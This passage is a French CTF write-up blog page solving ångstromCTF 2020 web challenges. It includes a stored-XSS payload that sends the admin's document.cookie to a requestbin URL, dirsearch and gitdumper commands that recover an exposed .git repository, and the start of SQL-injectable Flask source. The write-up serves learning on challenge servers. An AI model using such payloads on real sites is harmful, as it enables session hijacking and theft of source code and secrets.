<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>📋 ångstromCTF 2020 - Thomza - Blog</title><meta name=Description content><meta property="og:title" content="📋 ångstromCTF 2020"><meta property="og:description" content="Write ups des challenges web du ångstromCTF 2020"><meta property="og:type" content="article"><meta property="og:url" content="https://thyzavard.github.io/posts/wu_angstrom_20/"><meta property="og:image" content="https://thyzavard.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-03-20T10:30:00+02:00"><meta property="article:modified_time" content="2020-03-20T10:30:00+02:00"><meta property="og:site_name" content="Thomza - Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://thyzavard.github.io/logo.png"><meta name=twitter:title content="📋 ångstromCTF 2020"><meta name=twitter:description content="Write ups des challenges web du ångstromCTF 2020"><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://thyzavard.github.io/posts/wu_angstrom_20/><link rel=prev href=https://thyzavard.github.io/posts/wi_fic_19/><link rel=next href=https://thyzavard.github.io/posts/wu_ecsc_20/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><link rel=stylesheet href=https://thyzavard.github.io/css/main.css><script type=text/javascript src=https://thyzavard.github.io/js/main.js></script>
<script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"📋 ångstromCTF 2020","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/thyzavard.github.io\/posts\/wu_angstrom_20\/"},"genre":"posts","keywords":"CTF, Web","wordcount":2788,"url":"https:\/\/thyzavard.github.io\/posts\/wu_angstrom_20\/","datePublished":"2020-03-20T10:30:00+02:00","dateModified":"2020-03-20T10:30:00+02:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Thomza"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Thomza - Blog"><span class=header-title-pre>🗿</span>Thomza</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>🖊️ Posts </a><a class=menu-item href=/photography/>📷 Photography </a><a class=menu-item href=/categories/>📂 Categories </a><a class=menu-item href=/tags/>🏷️ Tags </a><a class=menu-item href=/about/>🗿 About me </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Thomza - Blog"><span class=header-title-pre>🗿</span>Thomza</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>🖊️Posts</a><a class=menu-item href=/photography/ title>📷Photography</a><a class=menu-item href=/categories/ title>📂Categories</a><a class=menu-item href=/tags/ title>🏷️Tags</a><a class=menu-item href=/about/ title>🗿About me</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">📋 ångstromCTF 2020</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Thomza</a></span>&nbsp;<span class=post-category>included in <a href=/categories/write-up/><i class="far fa-folder fa-fw" aria-hidden=true></i>Write up</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2020-03-20>2020-03-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;2788 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;14 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#the-magic-word>The Magic Word</a></li><li><a href=#xmas-still-stands>Xmas Still Stands</a></li><li><a href=#consolation>Consolation</a></li><li><a href=#git-good>Git Good</a></li><li><a href=#secret-agents>Secret Agents</a></li><li><a href=#defunds-crypt>Defund&rsquo;s Crypt</a></li><li><a href=#woooosh>Woooosh</a></li></ul></nav></div></div><div class=content id=content><h1 id=web>Web</h1><h2 id=the-magic-word>The Magic Word</h2><blockquote><p><strong>DESCRIPTION</strong>: <a href=https://magicword.2020.chall.actf.co/ target=_blank rel="noopener noreffer">Ask and you shall receive</a>&mldr;that is as long as you use the magic word.</p></blockquote><p>On tombe sur une page statique avec le message &ldquo;give flag&rdquo;.
<img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_magic_word.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_magic_word.png, /posts/wu_angstrom_20/angstrom_2020_magic_word.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_magic_word.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_magic_word.png title=Challenge width=769 height=326>
Dans ce premier challenge, rien de très compliqué. On affiche les sources de la page affiché. Et on tombe sur le script Javascript suivant:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>msg</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;magic&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>setInterval</span><span class=p>(</span><span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>magic</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>==</span> <span class=s2>&#34;please give flag&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;/flag?msg=&#34;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>innerText</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=p>.</span><span class=nx>then</span><span class=p>(</span><span class=nx>res</span> <span class=p>=&gt;</span> <span class=nx>res</span><span class=p>.</span><span class=nx>text</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=p>.</span><span class=nx>then</span><span class=p>(</span><span class=nx>txt</span> <span class=p>=&gt;</span> <span class=nx>magic</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=nx>txt</span><span class=p>.</span><span class=nx>split</span><span class=sb>``</span><span class=p>.</span><span class=nx>map</span><span class=p>(</span><span class=nx>v</span> <span class=p>=&gt;</span> <span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>(</span><span class=nx>v</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>^</span> <span class=mh>0xf</span><span class=p>)).</span><span class=nx>join</span><span class=sb>``</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>},</span> <span class=mi>1000</span><span class=p>);</span>
</span></span></code></pre></div><p>Si la balise avec l&rsquo;id &ldquo;magic&rdquo; contient la texte &ldquo;please give flag&rdquo;, ce dernier va être affiché.
On inspecte l&rsquo;élément, on change la valeur de contenu dans la balise avec l&rsquo;id &ldquo;magic&rdquo;. Et le flag apparaît.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_magic_word_flag.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_magic_word_flag.png, /posts/wu_angstrom_20/angstrom_2020_magic_word_flag.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_magic_word_flag.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_magic_word_flag.png title=Challenge width=1378 height=223></p><h2 id=xmas-still-stands>Xmas Still Stands</h2><blockquote><p><strong>DESCRIPTION</strong>: You remember when I said I dropped clam&rsquo;s tables? Well that was on Xmas day. And because I ruined his Xmas, he created the <a href=https://xmas.2020.chall.actf.co/ target=_blank rel="noopener noreffer">Anti Xmas Warriors</a> to try to ruin everybody&rsquo;s Xmas. Despite his best efforts, Xmas Still Stands. But, he did manage to get a flag and put it on his site. Can you get it?</p></blockquote><p>Nous sommes redirigés vers un site visant à détruire Noël! Le site est composé de <strong>4</strong> onglets:</p><ul><li><strong>Home</strong> -> Un simple message expliquant l&rsquo;intérêt du site</li><li><strong>Post</strong> -> Une zone de texte permettant de donner des idées sur comment ruiner Noël</li><li><strong>Report</strong> -> Ici, nous pouvons renseigner l&rsquo;ID d&rsquo;un post à un administrateur afin qu&rsquo;il aille en vérifier son contenu</li><li><strong>Admin</strong> -> Page d&rsquo;administration inaccessible sans le cookie administrateur</li></ul><p>Tout de suite, je pense à une XSS où il va falloir voler le cookie de l&rsquo;administrateur. Pour ce faire, il faut trouver où est situé la XSS. Avec un simple payload <code>&lt;img src=x onerror=alert('XSS');></code> dans la zone de texte de l&rsquo;onglet <strong>Post</strong>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_xmas_xss.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_xmas_xss.png, /posts/wu_angstrom_20/angstrom_2020_xmas_xss.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_xmas_xss.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_xmas_xss.png title=Challenge width=872 height=516></p><p>Sans surprise, l&rsquo;alert apparaît.</p><p>Pour récupérer le cookie, il va falloir un hook sur lequel effectuer une requête contenant le cookie de l&rsquo;administrateur. Pour cela, j&rsquo;ai utilisé <a href=http://requestbin.net/ target=_blank rel="noopener noreffer">requestbin</a>.<br>Le payload est triviale :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>img</span> <span class=nx>src</span><span class=o>=</span><span class=nx>x</span> <span class=nx>onerror</span><span class=o>=</span><span class=s2>&#34;this.src=&#39;http://requestbin.net/r/xxxxxxxx/?&#39;+document.cookie; this.removeAttribute(&#39;onerror&#39;);&#34;</span><span class=o>&gt;</span><span class=sb>`.  
</span></span></span></code></pre></div><p>Une fois le post envoyé, on récupère son ID et on la renseigne dans l&rsquo;onglet <strong>Report</strong> afin qu&rsquo;un administrateur vienne jeter un œil à notre post. On attend quelques secondes et une requête est effectuée sur notre hook, avec dans l&rsquo;URL, le <strong>nom</strong> et la <strong>valeur</strong> du cookie.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_xmas_get.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_xmas_get.png, /posts/wu_angstrom_20/angstrom_2020_xmas_get.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_xmas_get.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_xmas_get.png title=Challenge width=1011 height=516></p><p>Il ne reste plus qu&rsquo;à renseigner ce cookie dans notre navigateur et d&rsquo;essayer d&rsquo;accéder à la section <strong>Admin</strong>.
Et voilà!</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_xmas_flag.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_xmas_flag.png, /posts/wu_angstrom_20/angstrom_2020_xmas_flag.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_xmas_flag.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_xmas_flag.png title=Challenge width=713 height=306></p><p>Flag <code>actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}</code></p><h2 id=consolation>Consolation</h2><blockquote><p><strong>DESCRIPTION</strong>: I&rsquo;ve been feeling down lately&mldr; <a href=https://consolation.2020.chall.actf.co/ target=_blank rel="noopener noreffer">Cheer me up!</a></p></blockquote><p>Sur ce challenge, on arrive sur une page avec un bouton et un compteur de $. Lorsque l&rsquo;on clique sur le bouton, le compteur est incrémenté de 25$. Lorsque j&rsquo;ai inspecté la page, j&rsquo;ai vu l&rsquo;existence d&rsquo;un script <a href=https://consolation.2020.chall.actf.co/iftenmillionfireflies.js target=_blank rel="noopener noreffer">iftenmillionfireflies.js</a> qui est totalement obfusqué.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_consolation.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_consolation.png, /posts/wu_angstrom_20/angstrom_2020_consolation.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_consolation.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_consolation.png title=Challenge width=216 height=266></p><p>J&rsquo;ai d&rsquo;abord cru qu&rsquo;il fallait &ldquo;déobfusquer&rdquo; le script afin de comprendre son fonctionnement. Grâce à ça, j&rsquo;ai découvert beaucoup de choses, mais qui au final était juste là pour brouiller les pistes!</p><p>Lorsque je faisais des tests dans la console afin de vérifier le contenu de certaines variables, j&rsquo;ai cliqué sur le bouton et la console s&rsquo;est effacé! C&rsquo;est à ce moment-là que j&rsquo;ai compris qu&rsquo;il fallait creuser comprendre pourquoi clear la console à chaque clique sur le bouton. En faisant une recherche du mot-clé <code>clear</code> dans le script JS obfusqué, j&rsquo;ai trouvé cette instruction, qui est la cause du clear de la console lors d&rsquo;un clique sur le bouton.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_consolation_clear.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_consolation_clear.png, /posts/wu_angstrom_20/angstrom_2020_consolation_clear.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_consolation_clear.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_consolation_clear.png title=Challenge width=550 height=33></p><p>J&rsquo;ai téléchargé le script JS et la page HTML en local et j&rsquo;ai supprimé l&rsquo;instruction <code>console['clear']();</code>, j&rsquo;ai cliqué sur le bouton et TA-DA!</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_consolation_flag.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_consolation_flag.png, /posts/wu_angstrom_20/angstrom_2020_consolation_flag.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_consolation_flag.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_consolation_flag.png title=Challenge width=499 height=112></p><p>Flag <code>actf{you_would_n0t_beli3ve_your_eyes}</code></p><h2 id=git-good>Git Good</h2><blockquote><p><strong>DESCRIPTION</strong>: Did you know that angstrom has a git repo for all the challenges? I noticed that clam committed <a href=https://gitgood.2020.chall.actf.co/ target=_blank rel="noopener noreffer">a very work in progress challenge</a> so I thought it was worth sharing.</p></blockquote><p>On arrive sur une page statique avec le message &ldquo;Hello, world!&rdquo; affiché. En effectuant des recherches classiques &lsquo;/robots.txt&rsquo;, &lsquo;/.git&rsquo;, etc. Je n&rsquo;ai rien trouvé d&rsquo;intéressant, j&rsquo;ai également essayé de lister les répertoires avec <code>gobuster</code>, sans succès non plus. J&rsquo;ai fini par essayer l&rsquo;outil <a href=https://github.com/maurosoria/dirsearch target=_blank rel="noopener noreffer">dirsearch</a> qui a eu plus de succès !</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ python dirsearch.py -u https://gitgood.2020.chall.actf.co -e * -b
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>200</span> -   15B  - /.git/COMMIT_EDITMSG
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>200</span> -   92B  - /.git/config
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>200</span> -   23B  - /.git/HEAD
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>200</span> -   73B  - /.git/**description**
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>200</span> -  537B  - /.git/index
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>200</span> -  240B  - /.git/info/exclude
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>200</span> -  353B  - /.git/logs/HEAD
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>301</span> -  195B  - /.git/logs/refs  -&gt;  /.git/logs/refs/
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>301</span> -  207B  - /.git/logs/refs/heads  -&gt;  /.git/logs/refs/heads/
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>200</span> -  353B  - /.git/logs/refs/heads/master
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>301</span> -  197B  - /.git/refs/heads  -&gt;  /.git/refs/heads/
</span></span><span class=line><span class=cl><span class=o>[</span>21:55:29<span class=o>]</span> <span class=m>200</span> -   41B  - /.git/refs/heads/master
</span></span></code></pre></div><p>Finalement, nous n&rsquo;avons pas accès au répertoire &lsquo;.git&rsquo; mais il est possible d&rsquo;avoir accès à tous les fichiers contenu dans ce répertoire.<br>Le script n&rsquo;a pas trouvé tous les fichiers, car il manque le répertoire &lsquo;objects&rsquo; caractéristiques de la structure du répertoire &lsquo;.git&rsquo;.<br>Pour extraire l&rsquo;ensemble des fichiers contenu dans le répertoire &lsquo;.git&rsquo;, j&rsquo;ai utiliser l&rsquo;outil <code>gitdumper</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ bash gitdumper.sh https://gitgood.2020.chall.actf.co/.git/ clone
</span></span><span class=line><span class=cl><span class=c1>###########</span>
</span></span><span class=line><span class=cl><span class=c1># GitDumper is part of https://github.com/internetwache/GitTools</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Developed and maintained by @gehaxelt from @internetwache</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Use at your own risk. Usage might be illegal in certain circumstances. </span>
</span></span><span class=line><span class=cl><span class=c1># Only for educational purposes!</span>
</span></span><span class=line><span class=cl><span class=c1>###########</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Destination folder does not exist
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Creating tmp/.git/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: HEAD
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/info/packs
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: **description**
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: config
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: COMMIT_EDITMSG
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: index
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Downloaded: packed-refs
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: refs/heads/master
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Downloaded: refs/remotes/origin/HEAD
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Downloaded: refs/stash
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: logs/HEAD
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: logs/refs/heads/master
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Downloaded: logs/refs/remotes/origin/HEAD
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: info/refs
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: info/exclude
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/e9/75d678f209da09fff763cd297a6ed8dd77bb35
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Downloaded: objects/00/00000000000000000000000000000000000000
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/6b/3c94c0b90a897f246f0f32dec3f5fd3e40abb5
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/94/02d143d3d7998247c95597b63598ce941e7bcb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/b6/30430d9d393a6b143af2839fd24ac2118dba79
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/c2/658d7d1b31848c3b71960543cb0368e56cd4c7
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/63/8887a54973265c428cd51ce6dfd48f196d91c4
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/49/b319c37dc674bca682cab0f2506473dda6bd9a
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/78/9fa5caf452f5f6f25bfa9b1c0ab1d593dce1b3
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/8f/08af35205d0ba80e94b4f4306311039d62e138
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/24/7c9d491c0d2d6da5e93afcd0681b3edd7ccd70
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: objects/0f/52598006f9cdb21db2f4c8d44d70535630289b
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> clone
</span></span><span class=line><span class=cl>$ git status
</span></span><span class=line><span class=cl>On branch master
</span></span><span class=line><span class=cl>Changes not staged <span class=k>for</span> commit:
</span></span><span class=line><span class=cl>  <span class=o>(</span>use <span class=s2>&#34;git add/rm &lt;file&gt;...&#34;</span> to update what will be committed<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=o>(</span>use <span class=s2>&#34;git restore &lt;file&gt;...&#34;</span> to discard changes in working directory<span class=o>)</span>
</span></span><span class=line><span class=cl>	deleted:    .gitignore
</span></span><span class=line><span class=cl>	deleted:    index.html
</span></span><span class=line><span class=cl>	deleted:    index.js
</span></span><span class=line><span class=cl>	deleted:    package-lock.json
</span></span><span class=line><span class=cl>	deleted:    package.json
</span></span><span class=line><span class=cl>	deleted:    thisistheflag.txt
</span></span></code></pre></div><p>Maintenant que le repo est en local, il est possible d&rsquo;interagir avec les commandes git classiques.<br>On remarque le fichier supprimé &rsquo;thisistheflag.txt&rsquo;, avec la commande <code>git checkout --</code> on restaure le fichier pour le lire.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ git checkout -- thisistheflag.txt
</span></span><span class=line><span class=cl>$ cat thisistheflag.txt
</span></span><span class=line><span class=cl>There used to be a flag here...
</span></span></code></pre></div><p>On comprend donc qu&rsquo;il faut remonter à un commit antérieur pour lire le flag précédemment renseigné.
Avec <code>git log</code>, on énumère tous les commits de la branche master. Et on trouve un seul commit avant celui actuel:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ git log
</span></span><span class=line><span class=cl>commit e975d678f209da09fff763cd297a6ed8dd77bb35 <span class=o>(</span>HEAD -&gt; master<span class=o>)</span>
</span></span><span class=line><span class=cl>Author: aplet123 &lt;noneof@your.business&gt;
</span></span><span class=line><span class=cl>Date:   Sat Mar <span class=m>7</span> 16:27:44 <span class=m>2020</span> +0000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Initial commit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>commit 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
</span></span><span class=line><span class=cl>Author: aplet123 &lt;noneof@your.business&gt;
</span></span><span class=line><span class=cl>Date:   Sat Mar <span class=m>7</span> 16:27:24 <span class=m>2020</span> +0000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    haha I lied this is the actual initial commit
</span></span></code></pre></div><p>Avec la commande <code>git reset --hard &lt;hash_commit></code>, on repositionne la tête de la branche sur le commit qui nous intéresse. Une fois sur le bon commit, il ne reste plus qu&rsquo;a afficher le flag!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ git reset --hard 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
</span></span><span class=line><span class=cl>$ cat thisistheflag.txt
</span></span><span class=line><span class=cl>actf<span class=o>{</span>b3_car3ful_wh4t_y0u_s3rve_wi7h<span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>btw this isn<span class=err>&#39;</span>t the actual git server
</span></span></code></pre></div><p>Flag: <code>actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}</code></p><h2 id=secret-agents>Secret Agents</h2><blockquote><p><strong>DESCRIPTION</strong>: Can you enter <a href=https://agents.2020.chall.actf.co/ target=_blank rel="noopener noreffer">the secret agent portal</a>? I&rsquo;ve heard someone has a flag 👀</p><p>Our insider leaked <a href=https://files.actf.co/b8ec533304b09d0100428d372d8392ba4f798bded442038e045334266d758b29/app.py target=_blank rel="noopener noreffer">the source</a>, but was &ldquo;terminated&rdquo; shortly thereafter&mldr;</p></blockquote><p>On nous fournit les sources du site, et on repère assez facilement qu&rsquo;une injection SQL est possible à partir du champ <strong>User-Agent</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>.secret</span> <span class=kn>import</span> <span class=n>host</span><span class=p>,</span> <span class=n>user</span><span class=p>,</span> <span class=n>passwd</span><span class=p>,</span> <span class=n>dbname</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>mysql.connector</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dbconfig</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;host&#34;</span><span class=p>:</span><span class=n>host</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;user&#34;</span><span class=p>:</span><span class=n>user</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;passwd&#34;</span><span class=p>:</span><span class=n>passwd</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;database&#34;</span><span class=p>:</span><span class=n>dbname</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/login&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
